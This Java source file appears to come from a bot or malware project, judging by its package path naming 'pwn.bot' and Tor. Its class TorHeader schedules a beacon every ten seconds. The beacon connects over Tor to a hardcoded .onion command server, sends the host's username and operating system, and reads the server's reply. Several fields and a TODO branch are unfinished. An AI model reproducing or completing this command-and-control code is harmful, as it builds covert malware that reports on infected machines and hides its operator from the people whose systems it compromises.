package com.github.kvac.pwn.kvacpwnroot.pwnbotsroot.pwn.bot.common.tor.header;

import com.github.kvac.pwn.kvacpwnroot.pwnbotsroot.pwn.bot.common.tor.handler.TorHandler;
import com.subgraph.orchid.TorClient;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import lombok.Getter;
import lombok.Setter;
import org.apache.commons.lang3.SystemUtils;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class TorHeader {

    Logger logger = LoggerFactory.getLogger(getClass());
    ScheduledExecutorService executor;
    Runnable command;

    @Getter
    @Setter
    static TorClient torClient;
    @Getter
    final TorHandler TOR_HANDLER = new TorHandler();

    public void init() {
        executor = Executors.newScheduledThreadPool(1);
        command = () -> {
            try {
                try (Socket socket = torClient.getSocketFactory().createSocket("pbc6urv4bakvxkjs.onion", 8000)) {
                    try (BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream())); PrintWriter writer = new PrintWriter(socket.getOutputStream(), true)) {
                        StringBuilder info = new StringBuilder();
                        info.append("[").append("USER").append("=").append(SystemUtils.getUserName()).append("]").append('\n');
                        info.append("[").append("OS").append("=").append(System.getProperty("os.name")).append("]").append('\n');
                        info.append("[").append("").append("=").append("").append("]").append('\n');
                        info.append("[").append("").append("=").append("").append("]").append('\n');
                        info.append("[").append("").append("=").append("").append("]").append('\n');
                        info.append("[").append("").append("=").append("").append("]").append('\n');
                        writer.println(info);
                        writer.println(1);
                        writer.flush();
                        String line = reader.readLine();
                        if (line.contains("1")) {
                            //TODO
                            logger.info("senddd");
                        }
                    }
                }
            } catch (Exception e) {
                logger.error("", e);
            }
        };
    }

    public void start() {
        executor.scheduleWithFixedDelay(this.command, 0, 10, TimeUnit.SECONDS);
    }
}
